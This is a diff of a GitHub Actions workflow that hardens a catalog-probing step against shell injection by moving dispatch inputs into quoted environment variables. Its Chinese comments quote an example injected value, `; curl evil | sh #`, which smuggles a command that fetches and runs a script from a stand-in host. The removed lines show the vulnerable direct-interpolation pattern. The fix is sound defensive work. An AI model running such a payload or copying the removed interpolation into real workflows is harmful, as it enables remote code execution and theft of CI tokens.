@@ -36,8 +36,21 @@ jobs:
 
       # 本 script 只讀:不寫 DB、不改 catalog.py、不翻 enabled。
       # 輸出的 verified_at / verified_note 需人工 review 後以 PR 填入。
+      # inputs 一律經 env 傳入並加引號,絕不直接內插進 run:。
+      # 直接內插等於把 workflow_dispatch 的自由文字欄位接到 shell 上(CWE-78):
+      # `--only "; curl evil | sh #"` 會成為 runner 上執行的指令,拿得到
+      # GITHUB_TOKEN 與這個 job 的全部環境。pages.yml 已採 env 寫法,此處對齊。
       - name: Probe catalog sources
+        env:
+          ONLY: ${{ inputs.only }}
+          ENABLED_ONLY: ${{ inputs.enabled_only }}
         run: |
-          python scripts/verify_catalog_sources.py \
-            ${{ inputs.only && format('--only {0}', inputs.only) || '' }} \
-            ${{ inputs.enabled_only && '--enabled-only' || '' }}
+          set -euo pipefail
+          args=()
+          if [ -n "$ONLY" ]; then
+            args+=(--only "$ONLY")
+          fi
+          if [ "$ENABLED_ONLY" = "true" ]; then
+            args+=(--enabled-only)
+          fi
+          python scripts/verify_catalog_sources.py ${args[@]+"${args[@]}"}
